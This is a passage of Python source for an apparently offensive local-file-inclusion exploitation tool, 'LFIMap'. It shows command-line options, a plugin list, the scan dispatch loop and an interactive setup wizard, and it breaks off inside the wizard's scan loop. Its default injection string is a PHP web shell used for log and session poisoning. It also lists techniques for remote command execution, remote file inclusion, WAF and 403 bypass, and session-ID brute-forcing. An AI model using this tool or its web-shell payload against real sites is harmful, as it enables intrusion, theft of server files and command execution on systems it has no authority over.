    auth_group.add_argument(
        "--auth-type",
        choices=["basic", "ntlm"],
        default="basic",
        help="Authentication type (basic, ntlm). Default: basic."
    )
    auth_group.add_argument(
        "--ntlm-domain",
        help="Domain for NTLM authentication (e.g., 'MYDOMAIN')."
    )

    # PHP Filter specific options
    php_filter_group = parser.add_argument_group("PHP Filter Options")
    php_filter_group.add_argument(
        "--php-filter-file",
        help="File to attempt to read with PHP filters (default: index.php)."
    )
    php_filter_group.add_argument(
        "--php-filter-custom",
        help="Custom PHP filter to use (e.g., 'convert.base64-decode|string.rot13')."
    )

    # Poisoning & Command Execution options
    poisoning_group = parser.add_argument_group("Poisoning & Command Execution Options")
    poisoning_group.add_argument(
        "--injection-string",
        default="<?php system($_GET['cmd']); ?>",
        help="PHP code to inject for poisoning attacks (default: '<?php system($_GET[\'cmd\']); ?>')."
    )
    poisoning_group.add_argument(
        "--cmd-param",
        default="cmd",
        help="GET parameter name for command execution (default: 'cmd')."
    )
    poisoning_group.add_argument(
        "--command",
        help="Command to execute after successful poisoning (e.g., 'id', 'ls -la')."
    )
    poisoning_group.add_argument(
        "--log-file",
        help="Specific log file path for log poisoning (default: auto-detected based on OS)."
    )
    poisoning_group.add_argument(
        "--session-id",
        help="PHP Session ID for session poisoning (e.g., 'abcdef1234567890').\n"
             "Note: This tool does NOT inject into the session; you must do that manually."
    )

    # Timing-based LFI options
    timing_group = parser.add_argument_group("Timing-Based LFI Options")
    timing_group.add_argument(
        "--expected-delay",
        type=int,
        default=5,
        help="Expected delay in seconds for timing-based LFI (default: 5)."
    )

    # Payload Encoding/Obfuscation options
    encoding_group = parser.add_argument_group("Payload Encoding & Obfuscation Options")
    encoding_group.add_argument(
        "--encode-url",
        action="store_true",
        help="URL encode the payload (e.g., / becomes %%2F)."
    )
    encoding_group.add_argument(
        "--encode-double-url",
        action="store_true",
        help="Double URL encode the payload (e.g., / becomes %%252F)."
    )
    encoding_group.add_argument(
        "--encode-triple-url",
        action="store_true",
        help="Triple URL encode the payload (e.g., / becomes %%25252F)."
    )
    encoding_group.add_argument(
        "--null-byte",
        action="store_true",
        help="Append a null byte (%%00) to the payload (useful for PHP)."
    )
    encoding_group.add_argument(
        "--path-truncation",
        action="store_true",
        help="Append many directory traversals (e.g., /././...) for path truncation."
    )
    encoding_group.add_argument(
        "--directory-traversal-variations",
        action="store_true",
        help="Test common directory traversal variations (e.g., ..%%2f, ....//) in basic LFI."
    )

    # Parameter Fuzzing
    fuzzing_group = parser.add_argument_group("Parameter Fuzzing Options")
    fuzzing_group.add_argument(
        "--fuzz-param",
        action="store_true",
        help="Automatically fuzz common parameter names (e.g., 'file', 'page', 'id') to find the vulnerable one. Ignored if --param is used."
    )

    args = parser.parse_args()

    # Handle dependency checks/lists first
    if args.list_depends:
        list_dependencies()
        sys.exit(0)
    
    # Handle list-plugins
    if args.list_plugins:
        print_info("\n[bold blue]Available Plugins:[/bold blue]")
        plugin_descriptions = {
            "403": "Attempt various 403 Forbidden bypass techniques (methods, headers, path mods).",
            "xforwardedfor": "Add X-Forwarded-For: 127.0.0.1 header.",
            "questionmark": "Append '??' to payload (Unix only, basic LFI).",
            "doubleslash2slash": "Convert backslashes to forward slashes (Windows only).",
            "unicodetrick": "Apply basic Unicode encoding tricks to payload (e.g., overlong UTF-8 for slashes).",
            "spoofhost-header": "Spoof Host header to 'localhost'.",
            "extra-dot": "Adds trailing dot to path (/etc/passwd.) to bypass poorly written filters.",
            "semicolon-injection": "Appends ;.php or ;.txt to trick path validators.",
            "path-normalization": "Uses /./ or /.././ to evade normalization.",
            "base64-in-path": "Base64-encode parts of path (e.g., L2V0Yy9wYXNzd2Q=) if server decodes.",
            "case-variation": "Variants like /EtC/PaSsWd to bypass case-sensitive filters.",
            "multi-encoding": "Applies double/triple encoding (..%%252f..%%252f) to beat WAFs.",
            "iis-double-slash": "Adds // to the path (IIS Only) to bypass filters.",
            "wrapper-phar": "Test phar:// for object injection via LFI.",
            "wrapper-zip": "Test zip:// read on vulnerable zip packages.",
            "wrapper-glob": "Use glob:// for directory listing (PHP specific).",
            "wrapper-data": "Inject raw data via data:// and test inclusion.",
            "proc-symlink": "Try LFI via /proc/self/fd/X symlinks and /proc/self/cwd/....",
            "session-id-bruteforce": "Bruteforce PHPSESSID (combined with session poisoning).",
            "exfil-data": "Attempts basic data exfiltration after LFI (e.g., print content).",
            "race-condition-lfi": "Attempts LFI via race conditions with temporary files (conceptual).",
            "waf-detection": "Identifies common WAFs via headers and responses (e.g., Cloudflare, Sucuri).",
            "lfi-error-fingerprint": "Looks for LFI indicators in HTML response (e.g., open_basedir, include() errors).",
            "mimetype-check": "Tests if file inclusion results in MIME/content-type hints.",
            "tab-trick": "Injects a %%09 (tab character) to trick extension checks.",
            "comment-trick": "Inserts /* style comments in traversal path (e.g., /etc/*/passwd).",
            "dotdot-trick": "Inserts double .. in traversal (e.g., /....//etc/passwd).",
            "fat-dot": "Adds %%e2%%80%%ae (right-to-left override) to obfuscate filenames.",
            "utf7-bypass": "Attempts UTF-7 payloads (+ADw-script+AD4) for weird charset misconfigs.",
            "clrf-injection": "Injects CRLF characters into headers (e.g., User-Agent) for various bypasses.",
            "rate-limit-adapter": "Adds a small delay between requests to bypass simple rate limiting."
        }
        for plugin_name, desc in plugin_descriptions.items():
            console.print(f"  - [yellow]{plugin_name}[/]: {desc}")
        sys.exit(0)

    if args.check_depends:
        check_dependencies()
        sys.exit(0)

    # Determine the effective method based on --method or --technique
    effective_method = args.method if args.method else args.technique if args.technique else "all"
    
    # Input validation
    if args.wizard:
        run_wizard()
        sys.exit(0)

    # Prepare targets for iteration
    initial_target_urls = []
    if args.load_file:
        try:
            with open(args.load_file, 'r') as f:
                initial_target_urls = [line.strip() for line in f if line.strip()]
            if not initial_target_urls:
                print_error(f"Error: Load file '{args.load_file}' is empty or contains no valid URLs.")
                sys.exit(1)
            print_info(f"Loaded {len(initial_target_urls)} target URLs from file: [cyan]{args.load_file}[/]")
        except FileNotFoundError:
            print_error(f"Error: Load file not found: {args.load_file}")
            sys.exit(1)
    elif args.url:
        initial_target_urls.append(args.url)
    
    # Check if a target is specified at all
    # A target is specified if there are initial_target_urls, OR if fuzz_param is enabled.
    if not initial_target_urls and not args.fuzz_param:
        print_error("Error: You must specify a target. This can be done by:")
        print_error("  - Providing a URL with 'FUZZ' placeholder (e.g., -u 'http://example.com/index.php?file=FUZZ')")
        print_error("  - Providing a file with target URLs (--load-file targets.txt)")
        print_error("  - Enabling parameter fuzzing (--fuzz-param) to find the vulnerable parameter.")
        parser.print_help()
        sys.exit(1)

    # Additional check for post_data if method_type is POST
    # If --param is used, and method is POST, post_data will be constructed.
    # If fuzz_param is used, and method is POST, post_data will be constructed during fuzzing.
    # So, only error if none of these conditions apply and post_data is missing for POST method.
    if args.method_type == "POST" and not args.post_data and not args.fuzz_param and not args.param:
        print_error("Error: When using --method-type POST, --post-data must be provided or --fuzz-param/--param used.")
        parser.print_help()
        sys.exit(1)

    print_banner()
    print_info(f"HTTP Method: [cyan]{args.method_type}[/]")
    if args.post_data:
        print_info(f"POST Data: [cyan]{args.post_data}[/]")
    if args.os:
        print_info(f"Target OS: [cyan]{args.os}[/]")
    
    # Get the list of excluded techniques
    excluded_techniques = args.exclude_technique if args.exclude_technique is not None else []
    if excluded_techniques:
        print_info(f"Excluding techniques: [red]{', '.join(excluded_techniques)}[/]")
    
    if args.param:
        print_info(f"Targeting specific parameter: [yellow]{args.param}[/]")
    if args.skip_param:
        print_info(f"Skipping parameters: [yellow]{', '.join(args.skip_param)}[/]")
    if args.plugin:
        print_info(f"Enabled plugins: [yellow]{', '.join(args.plugin)}[/]")

    print_info(f"Method(s) selected: [cyan]{effective_method}[/]")
    if args.proxy:
        print_info(f"Using Proxy: [cyan]{args.proxy}[/]")
    if args.output:
        print_info(f"Output will be saved to: [cyan]{args.output}[/]")
    if args.ignore_set_cookie:
        print_info(f"Ignoring Set-Cookie headers: [yellow]Enabled[/]")
    if args.ignore_redirects:
        print_info(f"Ignoring Redirects: [yellow]Enabled[/]")
    if args.referer:
        print_info(f"Custom Referer: [yellow]{args.referer}[/]")
    if args.http_version:
        print_info(f"Target HTTP Version: [cyan]{args.http_version}[/]")


    print_info("-" * 50)

    # If --fuzz-param is used without a specific URL, we need a dummy URL to start with
    # This scenario implies that the tool will find the vulnerable parameter and then use it.
    if not initial_target_urls and args.fuzz_param:
        print_info("No target URL provided, but --fuzz-param is enabled. Will attempt to fuzz parameters on a base URL (e.g., http://localhost/).")
        # Create a dummy URL for the fuzzing to start, it will be replaced if a param is found.
        initial_target_urls.append("http://localhost/") 

    # Loop through each target URL
    for target_url_base in initial_target_urls:
        print_info(f"\n[bold underline]Scanning Target: {target_url_base}[/bold underline]")
        
        # Create a mutable copy of args for the current iteration
        current_args = argparse.Namespace(**vars(args))
        current_args.url = target_url_base # The base URL for this iteration

        # If --param is specified, we need to construct the URL/post_data with FUZZ in that param
        if current_args.param:
            if current_args.method_type == 'GET':
                # Remove existing query string if any, and add the specified parameter with FUZZ
                base_url_part = current_args.url.split('?')[0]
                current_args.url = f"{base_url_part}?{current_args.param}=FUZZ"
                print_info(f"Adjusted URL for parameter '{current_args.param}': [yellow]{current_args.url}[/]")
            elif current_args.method_type == 'POST':
                # For POST with --param, we force post_data to be just 'param=FUZZ'
                current_args.post_data = f"{current_args.param}=FUZZ"
                print_info(f"Adjusted POST data for parameter '{current_args.param}': [yellow]{current_args.post_data}[/]")
            # Disable fuzz_param if a specific param is given, as it's now explicitly set
            current_args.fuzz_param = False
        
        # Initialize LFITool with the potentially modified URL/post_data
        lfi_tool = LFITool(current_args.url, current_args)

        # If fuzz_param is enabled (and not overridden by --param), run it
        if current_args.fuzz_param and not current_args.param: # Ensure --param isn't overriding
            lfi_tool.run_parameter_fuzzing()
            # After fuzzing, lfi_tool.url is updated to the vulnerable one (e.g., ?file=FUZZ)
            # This updated URL will be used by subsequent LFI methods.

        # Execute selected methods based on effective_method and excluded_techniques
        # This part remains largely the same, using lfi_tool's (potentially updated) self.url
        # and current_args.post_data
        if effective_method == "all":
            if "basic" not in excluded_techniques:
                lfi_tool.run_basic_lfi()
            if "php-filter" not in excluded_techniques:
                lfi_tool.run_php_filter()
            if "log-poisoning" not in excluded_techniques:
                lfi_tool.run_log_poisoning()
            if "session-poisoning" not in excluded_techniques:
                lfi_tool.run_session_poisoning()
            if "proc-self-environ" not in excluded_techniques:
                lfi_tool.run_proc_self_environ()
            if "data-uri" not in excluded_techniques:
                lfi_tool.run_data_uri()
            if "timing-based" not in excluded_techniques:
                lfi_tool.run_timing_lfi()
            if "exec-wrapper" not in excluded_techniques:
                lfi_tool.run_exec_wrapper()
            if "file-wrapper" not in excluded_techniques:
                lfi_tool.run_file_wrapper()
            if "wrapper-phar" not in excluded_techniques:
                lfi_tool.run_wrapper_phar()
            if "wrapper-zip" not in excluded_techniques:
                lfi_tool.run_wrapper_zip()
            if "wrapper-glob" not in excluded_techniques:
                lfi_tool.run_wrapper_glob()
            if "proc-symlink" not in excluded_techniques:
                lfi_tool.run_proc_symlink()
            if "rfi" not in excluded_techniques:
                lfi_tool.run_rfi()
            if "wrapper-phpinput" not in excluded_techniques:
                lfi_tool.run_wrapper_phpinput()
            if "wrapper-ftp" not in excluded_techniques:
                lfi_tool.run_wrapper_ftp()
            if "wrapper-gopher" not in excluded_techniques:
                lfi_tool.run_wrapper_gopher()
            if "race-condition-lfi" not in excluded_techniques:
                lfi_tool.run_race_condition_lfi()
        else:
            if effective_method not in excluded_techniques:
                if effective_method == "basic":
                    lfi_tool.run_basic_lfi()
                elif effective_method == "php-filter":
                    lfi_tool.run_php_filter()
                elif effective_method == "log-poisoning":
                    lfi_tool.run_log_poisoning()
                elif effective_method == "session-poisoning":
                    lfi_tool.run_session_poisoning()
                elif effective_method == "proc-self-environ":
                    lfi_tool.run_proc_self_environ()
                elif effective_method == "data-uri":
                    lfi_tool.run_data_uri()
                elif effective_method == "timing-based":
                    lfi_tool.run_timing_lfi()
                elif effective_method == "exec-wrapper":
                    lfi_tool.run_exec_wrapper()
                elif effective_method == "file-wrapper":
                    lfi_tool.run_file_wrapper()
                elif effective_method == "wrapper-phar":
                    lfi_tool.run_wrapper_phar()
                elif effective_method == "wrapper-zip":
                    lfi_tool.run_wrapper_zip()
                elif effective_method == "wrapper-glob":
                    lfi_tool.run_wrapper_glob()
                elif effective_method == "proc-symlink":
                    lfi_tool.run_proc_symlink()
                elif effective_method == "rfi":
                    lfi_tool.run_rfi()
                elif effective_method == "wrapper-phpinput":
                    lfi_tool.run_wrapper_phpinput()
                elif effective_method == "wrapper-ftp":
                    lfi_tool.run_wrapper_ftp()
                elif effective_method == "wrapper-gopher":
                    lfi_tool.run_wrapper_gopher()
                elif effective_method == "race-condition-lfi":
                    lfi_tool.run_race_condition_lfi()
            else:
                print_warning(f"The selected method '{effective_method}' is in the excluded list. No scan will be performed for {target_url_base}.")

    print_info(f"\n[bold]LFIMap scan finished for all targets.[/]")

def run_wizard():
    """
    Guides the user through setting up and running an LFI scan interactively.
    """
    print_info("Welcome to the LFIMap Wizard!")
    print_info("I will guide you through setting up your LFI scan.")

    # Create a dummy Namespace object to store collected arguments
    wizard_args = argparse.Namespace()

    # 1. Target URL or Load File
    target_source_choice = console.input("[cyan]Do you want to specify a single target URL or load targets from a file? (url/file, default: url):[/] ").strip().lower()
    wizard_args.url = None
    wizard_args.load_file = None

    if target_source_choice == 'file':
        while True:
            load_file_path = console.input("[cyan]Enter path to the file containing target URLs (one per line):[/] ").strip()
            if load_file_path:
                try:
                    with open(load_file_path, 'r') as f:
                        test_urls = [line.strip() for line in f if line.strip()]
                    if not test_urls:
                        print_warning("The file is empty or contains no valid URLs. Please provide a file with URLs.")
                        continue
                    wizard_args.load_file = load_file_path
                    break
                except FileNotFoundError:
                    print_warning(f"File not found: {load_file_path}. Please try again.")
                except Exception as e:
                    print_warning(f"Error reading file: {e}. Please check the file path and permissions.")
            else:
                print_warning("File path cannot be empty.")
    else: # Default to 'url'
        while True:
            url = console.input("[cyan]Enter the target URL (use 'FUZZ' as placeholder, e.g., http://example.com/index.php?file=FUZZ):[/] ").strip()
            if not url:
                print_warning("URL cannot be empty.")
                continue
            if "FUZZ" not in url:
                confirm = console.input("[yellow]Warning: 'FUZZ' placeholder not found in URL. Do you want to continue without it? (yes/no):[/] ").lower()
                if confirm != 'yes':
                    continue
            wizard_args.url = url
            break

    # 2. Parameter Fuzzing or Specific Parameter
    wizard_args.fuzz_param = False
    wizard_args.param = None
    
    param_choice = console.input("[cyan]Do you want to fuzz common parameters (--fuzz-param), or specify a single parameter to test (--param)? (fuzz/specific/no, default: no):[/] ").strip().lower()
    if param_choice == 'fuzz':
        wizard_args.fuzz_param = True
    elif param_choice == 'specific':
        while True:
            specific_param = console.input("[cyan]Enter the specific parameter name to test (e.g., 'file', 'id'):[/] ").strip()
            if specific_param:
                wizard_args.param = specific_param
                break
            else:
                print_warning("Parameter name cannot be empty.")
    
    # If fuzzing, ask about skipping parameters
    wizard_args.skip_param = []
    if wizard_args.fuzz_param:
        skip_param_choice = console.input("[cyan]Do you want to skip any parameters during fuzzing? (yes/no, default: no):[/] ").strip().lower()
        if skip_param_choice == 'yes':
            while True:
                skip_params_input = console.input("[cyan]Enter parameter names to skip, separated by spaces (e.g., 'param1 param2'):[/] ").strip()
                if skip_params_input:
                    wizard_args.skip_param = skip_params_input.split()
                    break
                else:
                    print_warning("No parameters entered. Skipping this option.")
                    break


    # 3. LFI Method/Technique
    method_choices = ["basic", "php-filter", "log-poisoning", "session-poisoning", "proc-self-environ", "data-uri", "timing-based", "exec-wrapper", "file-wrapper", "wrapper-phar", "wrapper-zip", "wrapper-glob", "proc-symlink", "rfi", "wrapper-phpinput", "wrapper-ftp", "wrapper-gopher", "race-condition-lfi", "all"]
    while True:
        console.print("[cyan]Choose an LFI exploitation method:[/]")
        for i, choice in enumerate(method_choices):
            console.print(f"  {i+1}. {choice}")
        method_input = console.input(f"[cyan]Enter number (1-{len(method_choices)}) or name (default: all):[/] ").strip()
        
        selected_method = None
        if method_input.isdigit():
            idx = int(method_input) - 1
            if 0 <= idx < len(method_choices):
                selected_method = method_choices[idx]
        elif method_input in method_choices:
            selected_method = method_input
        elif not method_input: # Default to 'all' if empty
            selected_method = "all"
        
        if selected_method:
            wizard_args.method = selected_method
            wizard_args.technique = selected_method # Also set technique for consistency
            break
        else:
            print_warning("Invalid method choice. Please try again.")

    # 4. HTTP Method (GET/POST)
    while True:
        method_type = console.input("[cyan]Use GET or POST for requests? (default: GET):[/] ").strip().upper()
        if not method_type:
            wizard_args.method_type = "GET"
            break
        if method_type in ["GET", "POST"]:
            wizard_args.method_type = method_type
            break
        else:
            print_warning("Invalid HTTP method. Please enter 'GET' or 'POST'.")

    # 5. POST Data (if POST method selected and no specific param is set)
    wizard_args.post_data = None
    if wizard_args.method_type == "POST" and not wizard_args.param: # Only ask if not using --param
        while True:
            post_data = console.input("[cyan]Enter POST data (use 'FUZZ' for payload placeholder, e.g., 'param1=value1&file=FUZZ'):[/] ").strip()
            if not post_data:
                print_warning("POST data cannot be empty for POST method unless --param is used.")
                continue
            if "FUZZ" not in post_data:
                print_warning("Warning: 'FUZZ' placeholder not found in POST data. This may prevent LFI exploitation.")
            wizard_args.post_data = post_data
            break

    # 6. User-Agent options
    wizard_args.user_agent = None
    wizard_args.mobile = False
    wizard_args.browser_user_agent = None # Initialize new arg
    
    ua_choice = console.input("[cyan]Do you want to set a custom User-Agent, simulate a mobile device, or specify a browser type? (custom/mobile/browser/no, default: no):[/] ").strip().lower()
    if ua_choice == 'custom':
        custom_ua = console.input("[cyan]Enter custom User-Agent string:[/]").strip()
        if custom_ua:
            wizard_args.user_agent = custom_ua
    elif ua_choice == 'mobile':
        wizard_args.mobile = True
    elif ua_choice == 'browser':
        browser_choices = list(USER_AGENTS.keys())
        while True:
            browser_input = console.input(f"[cyan]Enter browser type ({', '.join(browser_choices)}):[/] ").strip().lower()
            if browser_input in browser_choices:
                wizard_args.browser_user_agent = browser_input
                break
            else:
                print_warning("Invalid browser type. Please choose from the list.")
        
    # 7. Target OS
    os_choices = ["unix", "osx/macos", "windows", "none"]
    while True:
        console.print("[cyan]Specify the target operating system (e.g., unix, windows, osx/macos, or 'none' for all/auto-detect):[/]")
        for i, choice in enumerate(os_choices):
            console.print(f"  {i+1}. {choice}")
        os_input = console.input(f"[cyan]Enter number (1-{len(os_choices)}) or name (default: none):[/] ").strip().lower()

        selected_os = None
        if os_input.isdigit():
            idx = int(os_input) - 1
            if 0 <= idx < len(os_choices):
                selected_os = os_choices[idx]
        elif os_input in os_choices:
            selected_os = os_input
        elif not os_input: # Default to 'none' if empty
            selected_os = "none"
        
        if selected_os and selected_os != "none":
            wizard_args.os = selected_os
            break
        elif selected_os == "none":
            wizard_args.os = None # Set to None if 'none' is chosen
            break
        else:
            print_warning("Invalid OS choice. Please try again.")

    # 8. Wordlist
    wordlist_choice = console.input("[cyan]Do you want to use a wordlist for basic LFI? (yes/no, default: no):[/] ").strip().lower()
    wizard_args.wordlist = None
    if wordlist_choice == 'yes':
        wordlist_path = console.input("[cyan]Enter path to wordlist file:[/] ").strip()
        if wordlist_path:
            wizard_args.wordlist = wordlist_path
        else:
            print_warning("No wordlist path provided. Skipping wordlist usage.")

    # 9. Output file
    output_choice = console.input("[cyan]Do you want to save results to an output file? (yes/no, default: no):[/] ").strip().lower()
    wizard_args.output = None
    if output_choice == 'yes':
        output_path = console.input("[cyan]Enter path to output file:[/] ").strip()
        if output_path:
            wizard_args.output = output_path
        else:
            print_warning("No output path provided. Results will only be displayed in console.")

    # 10. Verbose mode
    verbose_choice = console.input("[cyan]Enable verbose output (request/response dumps)? (yes/no, default: no):[/] ").strip().lower()
    wizard_args.verbose = (verbose_choice == 'yes')

    # 11. Ignore server errors mode
    ignore_errors_choice = console.input("[cyan]Ignore server errors (e.g., 4xx, 5xx, timeouts) and continue scanning? (yes/no, default: no):[/] ").strip().lower()
    wizard_args.ignore_server_error = (ignore_errors_choice == 'yes') 

    # 12. Exclude techniques
    wizard_args.exclude_technique = []
    exclude_choice = console.input("[cyan]Do you want to exclude any specific LFI techniques? (yes/no, default: no):[/] ").strip().lower()
    if exclude_choice == 'yes':
        available_techniques = ["basic", "php-filter", "log-poisoning", "session-poisoning", "proc-self-environ", "data-uri", "timing-based", "exec-wrapper", "file-wrapper", "wrapper-phar", "wrapper-zip", "wrapper-glob", "proc-symlink", "rfi", "wrapper-phpinput", "wrapper-ftp", "wrapper-gopher", "race-condition-lfi"]
        console.print("[cyan]Available techniques to exclude:[/]")
        for i, tech in enumerate(available_techniques):
            console.print(f"  {i+1}. {tech}")
        
        excluded_list = []
        while True:
            exclude_input = console.input("[cyan]Enter technique name or number to exclude (e.g., 'basic' or '1'). Press Enter on an empty line to finish:[/] ").strip().lower()
            if not exclude_input:
                break
            
            selected_tech = None
            if exclude_input.isdigit():
                idx = int(exclude_input) - 1
                if 0 <= idx < len(available_techniques):
                    selected_tech = available_techniques[idx]
                else:
                    print_warning(f"Invalid number: {exclude_input}. Please enter a valid number from the list.")
            elif exclude_input in available_techniques:
                selected_tech = exclude_input
            else:
                print_warning(f"Invalid technique name: {exclude_input}. Please choose from the available techniques.")
            
            if selected_tech and selected_tech not in excluded_list:
                excluded_list.append(selected_tech)
                print_info(f"Added '[yellow]{selected_tech}[/]' to exclusion list.")
            elif selected_tech:
                print_warning(f"'[yellow]{selected_tech}[/]' is already in the exclusion list.")
        
        wizard_args.exclude_technique = excluded_list

    # 13. Ignore Set-Cookie
    ignore_set_cookie_choice = console.input("[cyan]Do you want to ignore 'Set-Cookie' headers from responses? (yes/no, default: no):[/] ").strip().lower()
    wizard_args.ignore_set_cookie = (ignore_set_cookie_choice == 'yes')

    # 14. Ignore Redirects
    ignore_redirects_choice = console.input("[cyan]Do you want to ignore HTTP redirects? (yes/no, default: no):[/] ").strip().lower()
    wizard_args.ignore_redirects = (ignore_redirects_choice == 'yes')

    # 15. Referer Header
    referer_choice = console.input("[cyan]Do you want to set a custom 'Referer' header? (yes/no, default: no):[/] ").strip().lower()
    wizard_args.referer = None
    if referer_choice == 'yes':
        custom_referer = console.input("[cyan]Enter custom Referer URL:[/]").strip()
        if custom_referer:
            wizard_args.referer = custom_referer
        else:
            print_warning("No Referer URL provided. Skipping custom Referer header.")

    # 16. HTTP Version
    http_version_choices = ["1.0", "1.1", "2"]
    while True:
        console.print("[cyan]Choose the HTTP protocol version (1.0, 1.1, 2, default: 1.1):[/]")
        for i, choice in enumerate(http_version_choices):
            console.print(f"  {i+1}. {choice}")
        http_version_input = console.input(f"[cyan]Enter number (1-{len(http_version_choices)}) or name (default: 1.1):[/] ").strip()

        selected_http_version = None
        if http_version_input.isdigit():
            idx = int(http_version_input) - 1
            if 0 <= idx < len(http_version_choices):
                selected_http_version = http_version_choices[idx]
        elif http_version_input in http_version_choices:
            selected_http_version = http_version_input
        elif not http_version_input: # Default to '1.1' if empty
            selected_http_version = "1.1"
        
        if selected_http_version:
            wizard_args.http_version = selected_http_version
            break
        else:
            print_warning("Invalid HTTP version choice. Please try again.")

    # 17. Plugins
    wizard_args.plugin = []
    plugin_choice = console.input("[cyan]Do you want to enable any plugins for advanced bypasses? (yes/no, default: no):[/] ").strip().lower()
    if plugin_choice == 'yes':
        available_plugins = ["403", "xforwardedfor", "questionmark", "doubleslash2slash", "unicodetrick", "spoofhost-header",
                             "extra-dot", "semicolon-injection", "path-normalization", "base64-in-path", "case-variation", "multi-encoding", "iis-double-slash",
                             "wrapper-phar", "wrapper-zip", "wrapper-glob", "wrapper-data", "proc-symlink", "session-id-bruteforce", "exfil-data", "race-condition-lfi",
                             "waf-detection", "lfi-error-fingerprint", "mimetype-check",
                             "tab-trick", "comment-trick", "dotdot-trick", "fat-dot", "utf7-bypass", "clrf-injection", "rate-limit-adapter"]
        console.print("[cyan]Available plugins to enable:[/]")
        for i, plugin_name in enumerate(available_plugins):
            console.print(f"  {i+1}. {plugin_name}")
        
        enabled_plugins_list = []
        while True:
            plugin_input = console.input("[cyan]Enter plugin name or number to enable (e.g., '403' or '1'). Press Enter on an empty line to finish:[/] ").strip().lower()
            if not plugin_input:
                break
            
            selected_plugin = None
            if plugin_input.isdigit():
                idx = int(plugin_input) - 1
                if 0 <= idx < len(available_plugins):
                    selected_plugin = available_plugins[idx]
                else:
                    print_warning(f"Invalid number: {plugin_input}. Please enter a valid number from the list.")
            elif plugin_input in available_plugins:
                selected_plugin = plugin_input
            else:
                print_warning(f"Invalid plugin name: {plugin_input}. Please choose from the available plugins.")
            
            if selected_plugin and selected_plugin not in enabled_plugins_list:
                enabled_plugins_list.append(selected_plugin)
                print_info(f"Enabled '[yellow]{selected_plugin}[/]' plugin.")
            elif selected_plugin:
                print_warning(f"'[yellow]{selected_plugin}[/]' is already enabled.")
        
        wizard_args.plugin = enabled_plugins_list


    # Set default values for other args that might be needed by LFITool but not prompted in wizard
    # These should match the default values in argparse.ArgumentParser
    wizard_args.proxy = None
    wizard_args.cookies = None
    wizard_args.headers = None
    wizard_args.timeout = 10
    wizard_args.retries = 3
    wizard_args.no_ssl_verify = False
    wizard_args.all = False # Wizard will run selected method, not necessarily all sub-techniques unless specified
    wizard_args.auth_user = None
    wizard_args.auth_pass = None
    wizard_args.auth_type = "basic"
    wizard_args.ntlm_domain = None
    wizard_args.php_filter_file = None
    wizard_args.php_filter_custom = None
    wizard_args.injection_string = "<?php system($_GET['cmd']); ?>"
    wizard_args.cmd_param = "cmd"
    wizard_args.command = None
    wizard_args.log_file = None # Will be auto-set based on OS in run_log_poisoning if not provided
    wizard_args.session_id = None
    wizard_args.expected_delay = 5
    wizard_args.encode_url = False
    wizard_args.encode_double_url = False
    wizard_args.encode_triple_url = False # New default
    wizard_args.null_byte = False
    wizard_args.path_truncation = False
    wizard_args.directory_traversal_variations = False
    wizard_args.check_depends = False # Not set by wizard directly
    wizard_args.list_depends = False # Not set by wizard directly
    wizard_args.list_plugins = False # Not set by wizard directly

    # Special handling for multi-encoding plugin
    if wizard_args.plugin and "multi-encoding" in wizard_args.plugin:
        wizard_args.encode_url = True
        wizard_args.encode_double_url = True
        wizard_args.encode_triple_url = True


    print_info("\n[bold]Wizard setup complete. Review your settings:[/bold]")
    if wizard_args.url:
        console.print(f"  Target URL: [yellow]{wizard_args.url}[/]")
    elif wizard_args.load_file:
        console.print(f"  Target File: [yellow]{wizard_args.load_file}[/]")
    console.print(f"  Method: [yellow]{wizard_args.method}[/]")
    console.print(f"  HTTP Method: [yellow]{wizard_args.method_type}[/]")
    if wizard_args.post_data:
        console.print(f"  POST Data: [yellow]{wizard_args.post_data}[/]")
    if wizard_args.param:
        console.print(f"  Specific Parameter: [yellow]{wizard_args.param}[/]")
    if wizard_args.fuzz_param:
        console.print(f"  Fuzz Parameters: [yellow]Enabled[/]")
        if wizard_args.skip_param:
            console.print(f"    Skip Parameters: [yellow]{', '.join(wizard_args.skip_param)}[/]")
        else:
            console.print(f"    Skip Parameters: [yellow]None[/]")
    if wizard_args.user_agent:
        console.print(f"  Custom User-Agent: [yellow]{wizard_args.user_agent}[/]")
    elif wizard_args.browser_user_agent:
        console.print(f"  Browser User-Agent: [yellow]{wizard_args.browser_user_agent.capitalize()} (Random)[/]")
    elif wizard_args.mobile:
        console.print(f"  Mobile User-Agent: [yellow]Enabled[/]")
    if wizard_args.os:
        console.print(f"  Target OS: [yellow]{wizard_args.os.capitalize()}[/]")
    else:
        console.print(f"  Target OS: [yellow]None (will test all common paths)[/]")
    if wizard_args.wordlist:
        console.print(f"  Wordlist: [yellow]{wizard_args.wordlist}[/]")
    if wizard_args.output:
        console.print(f"  Output File: [yellow]{wizard_args.output}[/]")
    console.print(f"  Verbose: [yellow]{wizard_args.verbose}[/]")
    console.print(f"  Ignore Server Errors: [yellow]{wizard_args.ignore_server_error}[/]") 
    if wizard_args.exclude_technique:
        console.print(f"  Excluded Techniques: [red]{', '.join(wizard_args.exclude_technique)}[/]")
    else:
        console.print(f"  Excluded Techniques: [yellow]None[/]")
    console.print(f"  Ignore Set-Cookie: [yellow]{wizard_args.ignore_set_cookie}[/]")
    console.print(f"  Ignore Redirects: [yellow]{wizard_args.ignore_redirects}[/]")
    if wizard_args.referer:
        console.print(f"  Referer: [yellow]{wizard_args.referer}[/]")
    console.print(f"  HTTP Version: [yellow]{wizard_args.http_version}[/]")
    if wizard_args.plugin:
        console.print(f"  Enabled Plugins: [yellow]{', '.join(wizard_args.plugin)}[/]")
    else:
        console.print(f"  Enabled Plugins: [yellow]None[/]")


    confirm_run = console.input("[cyan]Do you want to start the scan with these settings? (yes/no):[/] ").strip().lower()
    if confirm_run != 'yes':
        print_info("Scan aborted by user.")
        sys.exit(0)

    print_info("\n[bold]Starting LFIMap scan based on wizard settings...[/bold]")
    
    # Handle target URLs from wizard
    target_urls_to_scan = []
    if wizard_args.load_file:
        try:
            with open(wizard_args.load_file, 'r') as f:
                target_urls_to_scan = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print_error(f"Error reading wizard load file: {e}")
            sys.exit(1)
    elif wizard_args.url:
        target_urls_to_scan.append(wizard_args.url)
    
    # If --fuzz-param is used without a specific URL, we need a dummy URL to start with
    if not target_urls_to_scan and wizard_args.fuzz_param:
        target_urls_to_scan.append("http://localhost/") # Dummy URL for fuzzing initiation

    for target_url_base in target_urls_to_scan:
        print_info(f"\n[bold underline]Scanning Target: {target_url_base}[/bold underline]")
        current_args = argparse.Namespace(**vars(wizard_args)) # Create a fresh copy of wizard args
        current_args.url = target_url_base # Set the current URL for this scan iteration

        # If --param is specified, we need to construct the URL/post_data with FUZZ in that param
